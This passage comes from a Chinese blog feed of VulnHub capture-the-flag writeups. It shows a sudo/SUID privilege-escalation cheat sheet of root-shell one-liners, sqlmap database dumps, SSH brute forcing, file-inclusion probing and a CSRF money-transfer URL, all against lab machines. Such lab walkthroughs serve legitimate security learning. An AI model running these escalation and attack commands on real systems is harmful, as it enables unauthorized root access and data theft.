--line-format=%L <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo ftp<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo gcc -<span class="hljs-keyword">wrapper</span> /bin/sh,-s .<br></code></pre></td></tr></table></figure><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo gdb -nx -<span class="hljs-keyword">ex</span> <span class="hljs-string">&#x27;!sh&#x27;</span> -<span class="hljs-keyword">ex</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sudo</span> <span class="hljs-built_in">ip</span> -force -batch /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo perl -e <span class="hljs-symbol">&#x27;exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;&#x27;<br></code></pre></td></tr></table></figure><h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> view -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo wget -i <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> watch -x sh -c &#x27;reset; exec sh <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo xxd /root/root.txt <span class="hljs-string">| xxd -r</span><br></code></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -u)<br>sudo zip <span class="hljs-variable">$TF</span> /etc/hosts -T -TT <span class="hljs-string">&#x27;sh #&#x27;</span><br>sudo <span class="hljs-built_in">rm</span> <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><h2 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h2><p>suid提权  共15关</p><img src="/.io//11/26/hacksudoLPE/image-20231002195530041.png" class title="image-20231002195530041"><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">以下命令用来发现可提权的suid文件  <br><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br><span class="hljs-built_in">find</span> / -perm -4000 -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h2 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h2><p>特权 capabilities 滥用</p><img src="/.io//11/26/hacksudoLPE/image-20231003140320108.png" class title="image-20231003140320108"><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">检查可执行文件获取的内核权限<br>getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h2 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h2><p>环境变量</p><img src="/.io//11/26/hacksudoLPE/image-20231003140638303.png" class title="image-20231003140638303">]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>vulnhub</tag>
      
      <tag>学习</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub靶场日记</title>
    <link href="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"/>
    <url>/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>先附一份网上找的难易顺序图，由于是从零开始，这里是先把容易的做完后尝试了几个latest</p><img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png" class title="难易顺序"><p>这里只放出了几个writeup写的相对较完整的记录</p><h3 id="doubletrouble1"><a href="#doubletrouble1" class="headerlink" title="doubletrouble1"></a>doubletrouble1</h3><h4 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h4><ol><li>扫ip 发现端口</li><li>22 80</li><li>访问80网页，发现cms  qdpm 9.1</li><li>searchsploit qdpm 9.1 发现存在rce漏洞但需要登录</li><li>dirb目录发现 &#x2F;secret&#x2F;图片 和</li><li>隐写工具 steghide info 查看图片信息，需要密码  说明存在隐藏信息</li><li>爆破工具 stegseek 利用rockyou字典爆破出密码，解密出隐写txt</li><li>txt中存在用户账号密码</li><li>登录网页后返回第4步，利用rce漏洞拿到后门</li><li>后门为get方式请求，蚁剑失效，改用反弹shell</li><li>拿到shell后查看可执行sudo，发现可执行文件 &#x2F;usr&#x2F;bin&#x2F;awk</li><li>搜索awk提权，一句话拿到root</li><li>&#x2F;root 目录下存在新的ova文件，scp下载到kali，再导入到本机用vmware打开</li><li>上一步scp无法使用，改用pyhon    靶机处 python3 -m http.server 8888      kali wget <a href="http://ip:8888/%E6%96%87%E4%BB%B6">http://ip:8888/文件</a> 下载</li></ol><h4 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h4><ol><li><p>扫ip，发现端口22，80</p></li><li><p>扫目录，没什么发现</p></li><li><p>80端口存在登录框，用sqlmap爆破</p></li><li><p>发现用户名uname处存在时间盲注，爆破数据库<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164041503.png" class title="image-20230919164041503"></p></li><li><p>针对doubletrouble库爆破表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;uname=11&amp;psw=11&amp;btnLogin=Login&quot;</span> <span class="hljs-attr">--D</span> doubletrouble <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164241627.png" class title="image-20230919164241627"></li><li><p>爆破列</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users --columns --batch</span><br></code></pre></td></tr></table></figure><img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164620259.png" class title="image-20230919164620259"></li><li><p>爆数据</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C username --dump --batch</span><br><br><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C password --dump --batch</span><br></code></pre></td></tr></table></figure><p><img src="/.io//image-20230919164858731.png" alt="image-20230919164858731"><img src="/.io//image-20230919165010345.png" alt="image-20230919165010345"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| username |</span><br><span class="hljs-section">+----------+</span><br>| clapton  |<br><span class="hljs-section">| montreux |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| password |</span><br><span class="hljs-section">+----------+</span><br>| GfsZxc1  |<br><span class="hljs-section">| ZubZub99 |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure></li><li><p>web无法登录，尝试ssh</p></li><li><p>ssh <a href="mailto:&#99;&#97;&#108;&#112;&#x74;&#x6f;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x34;&#56;&#x2e;&#49;&#x33;&#x38;">&#99;&#97;&#108;&#112;&#x74;&#x6f;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x34;&#56;&#x2e;&#49;&#x33;&#x38;</a>  密码 ZubZub99 登陆成功</p></li><li><p>脏牛提权，拿flag</p></li></ol><h3 id="deathnote1"><a href="#deathnote1" class="headerlink" title="deathnote1"></a>deathnote1</h3><ol><li>扫ip，发现端口 22 80</li><li>扫目录，robots.txt 里面发现了他爹的提示在 &#x2F;important.jpg</li><li>访问&#x2F;important.jpg ，抓包得到他爹的提示  账号在user.txt(不用你说我也发现了)  密码在某个网页的源码里<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230920105133832.png" alt="image-20230920105133832"></li><li>还是wordpress，还是一眼的uploads文件夹，找到user.txt 和 notes.txt, 先保存在本地</li><li>尝试访问&#x2F;wordpress&#x2F;，一直加载中(汤姆生气.jpg)，[直接wget下载源码，replace所有的deathnote.vuln为192.168.48.140 本地访问][也可以修改host文件]，发现hint中存在疑似密码 iamjustic3 先保存</li><li>尝试hydra 进行ssh爆破，大小写都失败，换思路</li><li>用wpscan扫描，-U user.txt -P password –api-token [token] 扫出来了<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921111846366.png" alt="image-20230921111846366"></li><li>访问&#x2F;wordpress&#x2F;wp-admin， 用小写账号密码登录，成功进入wp管理页面</li><li>后台页面不让改，msf利用wp_admin_shell_upload 也不行   重新整合已有数据</li><li>notes.txt里像是一个字典，尝试hydra ssh爆破，密码用notes.txt, 跑出来一个<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140036952.png" alt="image-20230921140036952"></li><li>ssh 连接进 l 用户，家目录有user.txt，鉴定为brainfuck，直接解码<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921140411876.png" alt="image-20230921140411876"></li><li>在opt&#x2F;L&#x2F;文件下有个提示，让看fake文件夹，cd进去，发现一个hint和一段wav文件</li><li>hint让用cyberchef，cat base.wav 得到一串数字<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142129436.png" alt="image-20230921142129436"></li><li>cyberchef后得到密码 <img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142226537.png" alt="image-20230921142226537" style="zoom: 80%;"></li><li>利用账号密码ssh到kira账户，拿到第一个flag<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230921142411444.png" alt="image-20230921142411444"></li><li>sudo -l 发现all   直接sudo su到root权限，cat &#x2F;root&#x2F;root.txt<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921143305226.png" class title="image-20230921143305226"></li></ol><p>CONGRAT!!!!!!!</p><h3 id="evalbox1"><a href="#evalbox1" class="headerlink" title="evalbox1"></a>evalbox1</h3><h4 id="本题新知识"><a href="#本题新知识" class="headerlink" title="本题新知识"></a>本题新知识</h4><ul><li>扫文件时可以针对性的加后缀</li><li>参数爆破</li><li>文件包含漏洞：先尝试写入木马，失败后查看敏感信息</li><li>得到用户名后可以尝试用字典爆破用户家目录</li><li>ssh公私钥登录</li><li>可提权文件检测</li></ul><ol><li><p>扫ip，发现端口22，80</p></li><li><p>扫目录，发现了个robots.txt，暂时没啥用，还有个&#x2F;secret&#x2F; 不可直接查看内容<img src="/.io//image-20230921161510525.png" alt="image-20230921161510525" style="zoom: 25%;"></p></li><li><p>扫&#x2F;secret&#x2F;下文件，失败，添加.php后缀，扫到&#x2F;secret&#x2F;evil.php</p></li><li><p>直接访问php文件，空空如也，搜索得知此处当用 [参数爆破] 或 [文件包含检测]</p></li><li><p>burp开始爆破，字典用web-fuzzing-dir里的parameter 7w多个参数名</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret/evil.php?§aaa§=../index.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.48.141<br></code></pre></td></tr></table></figure></li><li><p>发现存在参数command，检查后确定为文件包含漏洞<img src="/.io//image-20230921161918549.png" alt="image-20230921161918549">   <img src="/.io//image-20230921162039258.png" alt="image-20230921162039258"></p></li><li><p>利用php伪协议，拿到evil.php源码，只有一句include，无任何防护，直接开日</p></li><li><p>php:&#x2F;&#x2F;input 写入文件失败，查看敏感数据&#x2F;etc&#x2F;passwd上存在一个用户mowree，利用字典扫描该用户目录下存在的文件</p></li><li><p>接下来涉及到ssh公私钥爆破和公钥登录  拿shell后写入&#x2F;etc&#x2F;passwd提权</p></li></ol><h3 id="pwn-the-tron1"><a href="#pwn-the-tron1" class="headerlink" title="pwn the tron1"></a>pwn the tron1</h3><ol><li><p>扫ip，端口开放22 80 运行件版本没啥漏洞</p></li><li><p>查看网页，存在index.html 和 &#x2F;Travel&#x2F;index.html，里面有几张图片</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">A Tale <span class="hljs-keyword">of</span> Destructing<br>Cybertron was once <span class="hljs-keyword">a</span> home <span class="hljs-built_in">to</span> unique Autonomous Robotic Organism.<br>It has been thousands <span class="hljs-keyword">of</span> years since <span class="hljs-keyword">the</span> war between <span class="hljs-keyword">the</span> Autobots <span class="hljs-keyword">and</span> Deceptions started <span class="hljs-keyword">on</span> <span class="hljs-title">Cybertron</span>.<br>It destroyed <span class="hljs-keyword">the</span> planet <span class="hljs-keyword">and</span> made <span class="hljs-keyword">it</span> inhaspitable <span class="hljs-keyword">and</span> dead.<br><br>毁灭的故事<br>塞伯坦曾经是独特的自主机器人有机体的家园。<br>自从汽车人和欺骗者之间的战争在塞伯坦开始以来，已经过去了数千年。<br>它摧毁了这个星球，使它变得不可思议和死亡。<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">They arrived <span class="hljs-keyword">at</span> our Blue Planet, continuing their battle across <span class="hljs-keyword">the</span> universe.<br>Optimus Prime, leader <span class="hljs-keyword">of</span> Autobots took pledge <span class="hljs-built_in">to</span> protect <span class="hljs-keyword">the</span> humanity <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> evil wrath <span class="hljs-keyword">of</span> Megation.<br>Though lessen <span class="hljs-keyword">in</span> <span class="hljs-built_in">number</span>, Autobots are surely <span class="hljs-keyword">the</span> unsung warrions standing <span class="hljs-keyword">in</span> between <span class="hljs-keyword">the</span> destruction <span class="hljs-keyword">and</span> life.<br><br>他们抵达了我们的蓝色星球，继续他们在宇宙中的战斗。<br>汽车人领袖擎天柱发誓要保护人类免受Megation的邪恶愤怒。<br>虽然数量减少，但汽车人无疑是站在毁灭和生命之间的无名战士。<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Though Project Iacon, Megation <span class="hljs-built_in">found</span> <span class="hljs-keyword">out</span> about <span class="hljs-number">4</span> Omega Keys. <span class="hljs-keyword">If</span> these are used inside the Omega <span class="hljs-keyword">Lock</span> <span class="hljs-keyword">on</span> Cybertron, the Planet can be revived.<br>moreover, Omega <span class="hljs-keyword">Lock</span> can be used <span class="hljs-keyword">to</span> <span class="hljs-keyword">transform</span> Earth thus wiping <span class="hljs-keyword">out</span> the Humanity..!<br><br>通过Iacon计划，Megation发现了大约<span class="hljs-number">4</span>把欧米茄钥匙。如果将它们用于塞伯坦的欧米茄锁中，行星就可以复活。<br>此外，欧米茄锁可以用来改造地球，从而消灭人类..！<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">You are Jack. Assist <span class="hljs-keyword">the</span> Autobots <span class="hljs-keyword">in</span> stopping <span class="hljs-keyword">the</span> Megatron <span class="hljs-built_in">from</span> getting all <span class="hljs-keyword">the</span> <span class="hljs-number">4</span> <span class="hljs-built_in">keys</span>. Are you uo <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> mission?!<br>off <span class="hljs-keyword">the</span> Secret Autobot base!<br><br>你是杰克。协助汽车人阻止威震天获得所有 <span class="hljs-number">4</span> 把钥匙。你准备好执行任务了吗？！<br>离开秘密汽车人基地！<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vim">Optimus prime was able <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> encrypted coordinate of <span class="hljs-number">2</span> of <span class="hljs-built_in">keys</span> they appear <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> in same place.<br>You(Jack) are dispatched with bumblebee <span class="hljs-built_in">and</span> Arcee <span class="hljs-keyword">to</span> obtain the <span class="hljs-built_in">keys</span> <span class="hljs-keyword">do</span> it before Soundwave <span class="hljs-keyword">is</span> able <span class="hljs-keyword">to</span> decrypt them!<br><br>Can you <span class="hljs-keyword">find</span> @deception-base <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> the iacon_codes?<br>(Decepticons may <span class="hljs-keyword">delete</span> iacon codes out of security, <span class="hljs-keyword">find</span> <span class="hljs-keyword">a</span> way)<br><br>Encrypted message <span class="hljs-keyword">for</span> coordinates:<br>daab260727e470e56e77ec22e8f3d413<br><br>format <span class="hljs-keyword">for</span> decrypted message:<br><br>/iacon_code/(capital of <span class="hljs-keyword">a</span> countrey)/&#123;Latitude_dd.dd-Longitude_dd.dd&#125;.txt<br><br>d = any digit fron <span class="hljs-number">0</span>-<span class="hljs-number">9</span><br><br><br>擎天柱能够找到 <span class="hljs-number">2</span> 个密钥的加密坐标，它们似乎在同一个地方。<br>你（杰克）被派遣与大黄蜂和阿尔西一起在声波能够解密它们之前获得密钥！<br><br>你能找到@deception基地来获得iacon_codes吗？<br>（霸天虎可能会出于安全原因删除 iacon 代码，想办法）<br><br>坐标的加密消息：<br>DAAB260727E470E56E77EC22E8F3D413<br><br>解密消息的格式：<br><br>/iacon_code/（某国家首都）/&#123;Latitude_dd.dd-Longitude_dd.dd&#125;.txt<br><br>d = 任意数字 fron <span class="hljs-number">0</span>-<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure></li><li><p>综合这几篇信息，接下来有两种解法，要么找到所谓的deception基地，或者直接爆破，先爆出首都，再爆数字。</p></li><li><p>我们先尝试寻找deception基地，这里用到个新工具 <code>sharlock</code> （半社工工具，在社交平台搜索用户名），没搜出来，教程写的也有问题，扫出来有个<code>deception-base</code>，但是正确的用户叫<code>decepticon-base</code>，多了个c，咱也不知道人家咋整出来正确的，反正人家这样写的，我找不到</p></li><li><p>我们访问这个基地<code>https://github.com/decepticon-base/Projects</code>，发现内容被删了<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924123213003.png" alt="image-20230924123213003"></p></li><li><p>用<a href="http://archive.org/web/web.php">Wayback Machine</a>查看历史版本，只能说真牛逼<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924124522092.png" alt="image-20230924124522092"></p></li><li><p>写一份脚本跑一跑，发现之前幼稚了，既要iacon，又要首都，就很难受<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924131119001.png" alt="image-20230924131119001"></p></li><li><p>ok,访问一下</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Congrats On Getting Through <span class="hljs-keyword">the</span> First Stage!<br>Your Courage allowed us <span class="hljs-keyword">to</span> obtain <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-number">4</span> keys!<br>Here <span class="hljs-keyword">is</span> your <span class="hljs-keyword">first</span> Flag: Flag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>Bad News though :/ Megatron has <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> keys <span class="hljs-keyword">at</span> his disposal. Prime <span class="hljs-keyword">and</span> Bumblebee got information <span class="hljs-keyword">from</span> Starscream, a traitor <span class="hljs-keyword">and</span> ex-commander <span class="hljs-keyword">for</span> Megatron <span class="hljs-keyword">about</span> secret <span class="hljs-built_in">item</span> he has hidden inside most expensive thing <span class="hljs-keyword">in</span> knockout&#x27;s shop. That <span class="hljs-built_in">item</span> has admin credentials.<br>Link <span class="hljs-keyword">to</span> shop: /W4RSHIP_Sh0P.php<br>Good Luck!<br><br>恭喜您通过第一阶段！<br>您的勇气让我们获得了 <span class="hljs-number">4</span> 把钥匙中的 <span class="hljs-number">2</span> 把！<br>这是您的第一个标志：Flag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>坏消息：/威震天有 <span class="hljs-number">2</span> 把钥匙供他使用。Prime和大黄蜂从Starscream那里得到了信息，Starscream是威震天的叛徒和前指挥官，关于他藏在Knockout商店中最昂贵的东西里的秘密物品。该项目具有管理员凭据。<br>商店链接： /W4RSHIP_Sh0P.php<br>祝你好运！<br></code></pre></td></tr></table></figure></li><li><p>接着进入商店页面，经过观察可能存在csrf漏洞，有个转账功能，转账的发起人和接收人都是以参数的形式传递的，我们可以构造一段让网站管理员给我转账一万元的链接，发给管理员(网站”刚好”有一个发送邮件的功能而且管理员”刚好”会点击这个邮件)，于是我们可以购买后两个key</p></li><li><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924195118235.png" alt="image-20230924195118235"></p></li><li><pre><code class="hljs">网站管理员叫admin_boss（源码里翻到的）http://192.168.48.145/W4RSHIP_Sh0P_transfer.php?to=cxkcxk&amp;amount=100000&amp;from=lord_starscream <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>12. 很好，现在我们有钱了，直接买买买！唉？买不了！！！   查看源码![image-20230925084336824](C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230925084336824.png)<br><br>13. 好好好，注释我变量是吧，上脚本！<br><br>    ```python<br>    import requests<br>    <br>    <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://192.168.48.145/W4RSHIP_Sh0P_buy.php&quot;</span><br>    data=&#123; <span class="hljs-string">&quot;itemid&quot;</span>: 2, <span class="hljs-string">&quot;price&quot;</span>:9999&#125;<br>    header=&#123;<br>        <span class="hljs-string">&#x27;cookie&#x27;</span>:<span 